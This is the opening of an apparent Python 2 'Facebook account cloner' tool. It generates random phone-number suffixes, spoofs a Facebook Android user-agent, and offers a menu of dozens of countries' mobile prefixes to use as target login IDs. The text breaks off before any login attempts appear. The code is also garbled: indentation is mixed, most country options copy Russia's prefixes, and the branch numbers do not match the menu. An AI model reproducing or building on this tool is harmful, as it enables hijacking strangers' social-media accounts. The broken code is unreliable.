#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To Arbab Ali
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(1000):
 
    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')
 
    print(nmbr)
 
    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 nmbr.py')
    
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
 
 
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
def exb():
	print '[!] Exit'
	os.sys.exit()
 
def psb(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
 
def t():
    time.sleep(1)
def cb():
    os.system('clear')
##### LOGO #####
logo='''
 
\x1b[1;96m░█████╗░██████╗░██████╗░░█████╗░██████╗░
\x1b[1;97m██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗
\x1b[1;95m███████║██████╔╝██████╦╝███████║██████╦╝
\x1b[1;94m██╔══██║██╔══██╗██╔══██╗██╔══██║██╔══██╗
\x1b[1;91m██║░░██║██║░░██║██████╦╝██║░░██║██████╦╝
\x1b[1;97m╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝╚═════╝░
\x1b[1;93m--------------------------------------------------------------
\x1b[1;92m➣  YouTube  : CYBER GANGE HIDDEN TRICKER
\x1b[1;94m➣  Facebook : ARBAB MEMON
\x1b[1;93m➣  Note     : CYBER PLAYER R.H.S 1.0286
\x1b[1;95m➣  Warning  : IF NOT WORK THAN USE FREE VPN
\x1b[1;96m➣  Whatsapp : +923003023263
\x1b[1;97m➣  Note     : ANY KIND PROBLEM MSG ME.
\x1b[1;94m➣  Disclamiar :AWAY FROM ILLIGAL WAY.
\x1b[1;93m--------------------------------------------------------------"""
                                '''
 
back = 0
successful = []
cpb = []
oks = []
id = []
def menu():
	os.system('clear')
	print logo
	print "\033[1;97mCYBER_HACKER_GLAXY"
	print "\033[1;97mRIGHT_HANDED_PLAYER"
	print "\033[1;97mMOST_WELCOME_DEAR"
	print
        print 'Top 15 Countries Mix Number Clone'
	print "\033[1;92m[1]  Bangladesh"
	print '[2]  USA'
	print '[3]  UK'
	print '[4]  India'
	print '[5]  Brazil'
	print '[6]  Japan'
	print '[7]  Korea'
	print '[8]  Italy'
	print '[9]  Spain'
	print '[10] Poland'
	print '[11] Pakistan'
	print '[12] Indonessia'
	print '[13] Iran'
	print '[14] Iraq'
	print '[15] Saudi Arabia'
	print
	print "\033[1;93mVerified Ids Numbers Clone Fb"
	print '[16] Russia'
	print '[17]  Sudan'
	print '[18]  Germany'
	print '[19]  Dubai'
	print '[20]  Canada'
	print '[21]  Qatar'
	print '[22]  Polokwani'
	print '[23]  Thiland'
	print '[24]  Afghanistan'
	print '[25]  Turkey'
	print
	print "\033[1;94mOld Facebook Account Cloner"
	print '[26]  England'
	print '[27] Nepal'
	print '[28] Bhootan'
	print '[29] Kazkistsn'
	print '[30] Switzerland'
	print
	print "\033[1;95mIds Just For Login Clone Accounts"
	print '[31] Colombia'
	print '[32] Argentina'
	print '[33]  Sweden'
	print '[34]  Finland'
	print '[35]  Ukraine'
	print '[36]  Venezuela'
	print '[37]  Mexico'
	print '[38]  Bulgaria'
	print '[39]  Philpines'
	print '[40]  Denmark'
	print
	print "\033[1;96mDating Chating type Clone Accounts"
	print '[41] Lesotho'
	print '[42] Bermuda'
	print '[43] Swaziland'
	print '[44] Suriname'
	print '[45] Costa Rica'
	print '[46] Nicaragua'
	print '[47] Saudi Arabia'
	print '[48] Grenada'
	print
	print "[17] UPDATE COMMAND"
#	print '[3] Follow Me On Facebook'
	print '[0]  Exit            '
	print 50*'-'
	action()
 
 
def action():
	bch = raw_input('\n  ENTER HERE ANY CODE   ')
	if bch =='':
		print '[!] Fill in correctly'
		action()
	elif bch =="1":
		os.system("clear")
		print (logo)
		try:
			c = raw_input(" choose code  : ")
			k="+880"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="2":
		os.system("clear")
		print (logo)
		print("786, 815, 315, 256, 401, 718, 917, 202, 701, 303, 703, 803, 999, 708")
		try:
			c = raw_input(" choose code  : ")
			k="+1"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="3":
		os.system("clear")
		print (logo)
		print("737, 706, 748, 783, 739, 759, 790")
		try:
			c = raw_input(" choose code  : ")
			k="+44"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="4":
		os.system("clear")
		print (logo)
		print("954, 897, 967, 937, 700, 727, 965, 786, 874, 856, 566, 590, 527, 568, 578")
		try:
			c = raw_input(" choose code  : ")
			k="+91"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="5":
		os.system("clear")
		print (logo)
		print("127, 179, 117, 853, 318, 219, 834, 186, 479, 113")
		try:
			c = raw_input(" choose code  : ")
			k="+55"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="6":
		os.system("clear")
		print (logo)
		print("11, 12, 19, 16, 15, 13, 14, 18, 17")
		try:
			c = raw_input(" choose code  : ")
			k="+81"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="7":
		os.system("clear")
		print (logo)
		print("1, 2, 3, 4, 5, 6, 7, 8, 9")
		try:
			c = raw_input(" choose code  : ")
			k="+82"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="8":
		os.system("clear")
		print (logo)
		print("388, 390, 391, 371, 380, 368, 386, 384, 332, 344, 351, 328")
		try:
			c = raw_input(" choose code  : ")
			k="+39"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="9":
		os.system("clear")
		print (logo)
		print("60, 76, 73, 64, 69, 77, 65, 61, 75, 68")
		try:
			c = raw_input(" choose code  : ")
			k="+34"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="10":
		os.system("clear")
		print (logo)
		print("66, 69, 78, 79, 60, 72, 67, 53, 51")
		try:
			c = raw_input(" choose code  : ")
			k="+48"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="11":
		os.system("clear")
		print (logo)
		print("Jazz 300, 301, 302, 303, 304, 305, 306, 307, 308 ,309")
		print("Zong 310, 311, 312, 313, 316, 315, 316, 317")
		print("Telinor 340, 341, 342, 343, 344, 345, 346,")
		print("Ufone 336, 334, 335, 334, 332, 331,")
		print("Warid 320, 321, 322, 323, 324,")
		try:
			c = raw_input(" choose code  : ")
			k="+92"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:	
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")	
			menu()
	elif bch =="12":
		os.system("clear")
		print (logo)
		print("50, 21, 31,")
		try:
			c = raw_input(" choose code  : ")
			k="+62"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:	
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="13":
		os.system("clear")
		print (logo)
		print("911, 912, 913, 914, 915, 916, 917, 918, 931, 932, 934, 935, 936, 937,")
		try:
			c = raw_input(" choose code  : ")
			k="+98"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:	
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="14":
		os.system("clear")
		print (logo)
		print("73, 74, 75, 76, 77, 78, 79,")
		try:
			c = raw_input(" choose code  : ")
			k="+964"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="15":
		os.system("clear")
		print (logo)
		print("1, 2, 3, 4, 6, 7,")
		try:
			c = raw_input(" choose code  : ")  
			k="+966"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
			        id.append(line.strip())
		except IOError:
			  print ("[!] File Not Found")
			  raw_input("\n[ Back ]")
			  menu()
	elif bch =="16":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
        elif bch =="17":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
        elif bch =="18":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
        elif bch =="19":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
        elif bch =="20":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
        elif bch =="21":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
        elif bch =="22":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()       
	elif bch =="23":		
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="24":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
        elif bch =="25":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
        elif bch =="26":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
        elif bch =="27":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
        elif bch =="28":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
        elif bch =="29":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
        elif bch =="30":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="31":		
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="32":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
        elif bch =="33":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
        elif bch =="34":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
        elif bch =="35":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
        elif bch =="36":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
        elif bch =="37":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
        elif bch =="38":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu() 
	elif bch =="39":		
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="40":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
        elif bch =="41":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
        elif bch =="42":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
        elif bch =="43":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
        elif bch =="44":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
        elif bch =="45":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
        elif bch =="46":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()   
	elif bch =="47":		
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="48":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
        elif bch =="49":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
        elif bch =="50":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
        elif bch =="51":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
        elif bch =="52":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
        elif bch =="53":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
        elif bch =="54":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="55":		
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="56":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
        elif bch =="57":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
        elif bch =="58":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
        elif bch =="59":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
        elif bch =="60":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
        elif bch =="61":
		os.system("clear")
		print (logo)
